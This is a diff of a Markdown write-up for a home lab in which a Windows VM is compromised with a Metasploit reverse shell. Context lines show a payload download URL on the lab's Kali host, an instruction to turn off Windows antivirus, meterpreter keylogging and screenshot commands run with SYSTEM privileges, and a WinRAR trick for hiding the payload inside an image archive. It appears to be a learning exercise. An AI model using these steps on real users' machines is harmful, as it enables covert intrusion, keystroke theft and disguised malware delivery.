@@ -21,16 +21,21 @@ To explore how a Windows reverse shell works using Metasploit, test various post
 
 ## Network Configuration
 
-- Configured **NAT Network** in VirtualBox 
-  ![VirtualBox NAT Network Config](images/VirtualBoxNatNetworks.png)
-  ![Kali Linux Network Config](images/KaliLinuxNetwork.png)
-  ![Windows Network Config](images/WindowsNetwork.png)
+- Configured **NAT Network** in VirtualBox
+
+![VirtualBox NAT Network Config](images/VirtualBoxNatNetworks.png)
+  
+![Kali Linux Network Config](images/KaliLinuxNetwork.png)
+  
+![Windows Network Config](images/WindowsNetwork.png)
 
 - Checked Kali Linux IP using `ifconfig`: `10.0.2.4`  
-  ![Kali IP](images/KaliLinuxIP.png)
+  
+![Kali IP](images/KaliLinuxIP.png)
 
 - Checked Windows IP using `ipconfig`: `10.0.2.15`  
-  ![Windows IP](images/WindowsIP.png)
+  
+![Windows IP](images/WindowsIP.png)
 
 ---
 
@@ -51,9 +56,13 @@ sudo service apache2 start
 ```
 - Access payload from Windows:
 	- **Note: Turn off Windows `Virus & Threat Protection` before downloading the payload**
+
 ![Windows Virus & Threat Protection Settings](images/WindowsVirus.png)
+
 	- URL: http://10.0.2.4/Downloads/shellcode.exe
+
 ![Webpage to download payload](images/WindowsWebpage.png)
+
 ---
 
 ## Run Listener in Metasploit
@@ -92,6 +101,7 @@ meterpreter > keyscan_stop
 meterpreter > screenshot
 Screenshot saved to: /home/kali/WOmGThKH.jpeg
 ```
+
   ![Windows IP](images/WOmGThKH.jpeg)
 
 ---
@@ -218,9 +228,13 @@ Server username: NT AUTHORITY\SYSTEM
 
 ## Hiding Shellcode in Image
 - Used `WinRAR` to archeive both the payload and an image.
+
 ![Archeive Settings](images/ArcheiveFiles.png)
+
 - Put both of the files in `Run After Extraction` section
+
 ![Run After Extraction Section](images/RunAfterExtraction.png)
+
 ---
 
 ## Reference
